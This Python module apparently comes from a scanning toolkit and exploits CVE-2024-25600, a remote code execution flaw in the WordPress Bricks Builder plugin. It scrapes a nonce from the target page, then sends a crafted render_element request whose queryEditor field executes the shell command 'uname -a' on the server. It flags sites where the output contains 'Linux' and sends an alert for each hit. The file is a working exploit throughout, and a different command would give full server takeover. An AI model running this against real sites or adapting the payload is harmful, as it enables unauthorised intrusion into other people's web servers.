# WordPres_Bricks_Builder_scan.py
from Modules import ServerJ
from Common.Common_Request import common_request
import re
import json

bugName="WordPres Bricks Builder 前台RCE漏洞(CVE-2024-25600)"
def scan_WordPres_Bricks_Builder(url, proxies, append_to_output, serverJ_key, bugName):
    headers1 = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }

    response1 = common_request(url, path=None, headers=headers1,method='GET', timeout=15 ,proxies=proxies, append_to_output=append_to_output)
    if response1 is not None:
        match = re.search(r'"nonce":"([^"]+)"', response1)
        if match:
            nonce_value = match.group(1)
            print(nonce_value)  # 输出 64371ad630
            append_to_output(f"[+] nonce_value: {nonce_value} ", "red")
            path2 = "/wp-json/bricks/v1/render_element"

            headers2 = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
                'Accept': '*/*',
                'Content-Type': 'application/json'
            }

            data2 = {
                "postId": "1",
                "nonce": nonce_value,
                "element": {
                    "name": "container",
                    "settings": {
                        "hasLoop": "true",
                        "query": {
                            "useQueryEditor": True,
                            "queryEditor": "throw new Exception(`uname -a`);",
                            "objectType": "post"
                        }
                    }
                }
            }
            response2 = common_request(url, path=path2, data=json.dumps(data2),headers=headers2, method='POST', timeout=15, proxies=proxies,
                                          append_to_output=append_to_output)
            if response2 is not None:
                if response2.status_code == 200 and 'Linux' in response2.text:
                    append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
                    ServerJ.sc_send(bugName, f"漏洞连接: {url}\r\n漏洞类型: RCE漏洞", ServerJ_Key=serverJ_key)
                else:
                    append_to_output(f"[-] {url} 不存在{bugName}", "green")
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")
